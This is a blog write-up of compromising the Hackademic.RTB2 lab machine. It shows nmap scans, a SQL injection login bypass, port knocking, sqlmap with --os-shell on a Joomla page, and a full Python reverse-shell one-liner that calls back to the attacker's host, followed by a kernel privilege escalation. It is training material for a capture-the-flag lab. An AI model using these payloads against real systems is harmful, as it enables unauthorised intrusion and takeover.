---
layout: default
title : muzec - Hackademic.RTB2 Writeup
---


### Enumeration With Nmap


```
# Nmap 7.91 scan initiated Mon Sep 27 09:18:59 2021 as: nmap -sC -sV -p- -vv -oA nmap 172.16.139.228
Nmap scan report for 172.16.139.228
Host is up, received syn-ack (0.0017s latency).
Scanned at 2021-09-27 09:18:59 WAT for 9s
Not shown: 65534 closed ports
Reason: 65534 conn-refused
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.2.14 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Hackademic.RTB2

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 27 09:19:08 2021 -- 1 IP address (1 host up) scanned in 8.95 seconds
```

Should be easy i guess we are having only one port which is the HTTP port 80 let hit it.

![image](https://user-images.githubusercontent.com/69868171/134919140-b3682aea-4d03-41ec-9e24-1b4932189f4c.png)

Ahhh the demon login page i will say damn because man i was stuck for some hours after trying sql injection, sqlmap man i got nothing you know what is funny man it actually vulnerable to sql injection after checking up write up for the part.

```
username:- ' or 1=1--'
password:- ' or 1=1--'
```


That the sql injection that work i don't why all the payloads i try was not working.

![image](https://user-images.githubusercontent.com/69868171/134920611-715fcaa5-9d7a-4160-9c81-f6dba5f4cd90.png)

Now we are in let check the page source maybe we can get some clues to move on.

![image](https://user-images.githubusercontent.com/69868171/134920796-e32f0c2e-7f62-4b04-9a53-8f605de4e9f9.png)

I think we have something in the source.

![image](https://user-images.githubusercontent.com/69868171/134921480-bbf106a9-ab1b-479d-b937-bef818da0843.png)

It url-encoding so using CyberChef i Url-decode it and we have hex.

![image](https://user-images.githubusercontent.com/69868171/134924569-ef4cbce3-535a-40e0-ab65-bac19fdd8c79.png)

Decoding from hex and we have binary with a hint:- `Knock Knock Knockin' on heaven's door .. :)` .

![image](https://user-images.githubusercontent.com/69868171/134924781-542e1fa8-0ecd-4ef1-a50b-afc65813f5d4.png)

Boom we have the port sequence to knock i will be using nmap to recursively hit the ports using the -r switch.

```
nmap -r -p 1001,1101,1011,1001 172.16.139.230
```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/hackad]
└─$ nmap -r -p 1001,1101,1011,1001 172.16.139.230
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 12:15 WAT
WARNING: Duplicate port number(s) specified.  Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm).
Nmap scan report for 172.16.139.230
Host is up (0.0033s latency).

PORT     STATE  SERVICE
1001/tcp closed webpush
1011/tcp closed unknown
1101/tcp closed pt2-discover

Nmap done: 1 IP address (1 host up) scanned in 1.67 seconds
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/hackad]
└─$ nmap -sV 172.16.139.230                      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 12:16 WAT
Nmap scan report for 172.16.139.230
Host is up (0.0015s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.14 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.23 seconds
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/hackad]
└─$ nmap -sV 172.16.139.230                      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 12:16 WAT
Nmap scan report for 172.16.139.230
Host is up (0.0019s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.2.14 ((Ubuntu))
666/tcp open  http    Apache httpd 2.2.14 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.33 seconds
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/hackad]
```

We have a new port open now let try to access it.

![image](https://user-images.githubusercontent.com/69868171/134926638-bc6c36ec-711c-4ed1-bf4f-ae4b2ba0ecd2.png)

Powered by joomla smmooth going through the pages i found something interesting with some strange parameters.

![image](https://user-images.githubusercontent.com/69868171/134926982-c9ba224b-3dca-4a01-9a17-b04cfd3d7375.png)

I decided to test it with sqlmap.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/hackad]
└─$ sqlmap -u "http://172.16.139.230:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3" --dbs   
```

![image](https://user-images.githubusercontent.com/69868171/134927420-c8d30125-7ded-4cca-a6f8-c3a42b98bb91.png)

Boom it vulnerable to SQL injection let try using the os-shell switch onsqlmap with the database joomla.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/hackad]
└─$ sqlmap -u "http://172.16.139.230:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3" -D joomla --os-shell
        ___
```

![image](https://user-images.githubusercontent.com/69868171/134928281-e18ef2aa-e346-4882-b18f-9639264676d3.png)

We have shell smooth right, Now let try and get a proper shell.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.139.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image](https://user-images.githubusercontent.com/69868171/134928879-05902a1d-bd60-4536-9ade-68b86812f913.png)


Now let root it we are taking long man lol.

### Privilege Escalation


![image](https://user-images.githubusercontent.com/69868171/134929499-643852ab-9ab6-4e4c-b93a-e1b874f2eadd.png)

Pretty old versions let hit exploit-db.

![image](https://user-images.githubusercontent.com/69868171/134929701-9fafd1d4-4a72-4c6e-bdde-419340abb127.png)

We have the exploit now let get it onto our taget and compile it.

![image](https://user-images.githubusercontent.com/69868171/134930092-8c71751d-6994-40d5-8521-5be66f92af5d.png)


Ruuning and boom root.

![image](https://user-images.githubusercontent.com/69868171/134930187-9aed9535-1415-4a10-ad31-ae3aca36e971.png)

Getting The Key.txt in the  root folder.


![image](https://user-images.githubusercontent.com/69868171/134930349-d70b785c-7791-4708-935a-27f6d86a74cb.png)

But it in base64 let try and get it out.

![image](https://user-images.githubusercontent.com/69868171/134930446-04ae86b7-76a6-439b-94bb-d465f503fe90.png)

Starting `SimpleHTTPServer` on the target open port 8000 on the target which we can access with the target IP:8000.

![image](https://user-images.githubusercontent.com/69868171/134930753-da12e02e-2e27-46c5-a39f-ecb17d456911.png)

Now let get the Key.txt to decode.

![image](https://user-images.githubusercontent.com/69868171/134930878-60ef21eb-9124-4b0e-a23e-2f1814074745.png)

Using CyberChef we know it a PNG image encode in base64.

![image](https://user-images.githubusercontent.com/69868171/134931070-7d271cef-4720-46e0-bd8a-fc3d17f6dab4.png)

Using CyberChef to convert it back to PNG.

![image](https://user-images.githubusercontent.com/69868171/134931258-1db55a92-354b-415c-a532-2f09fd9e1712.png)

We are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
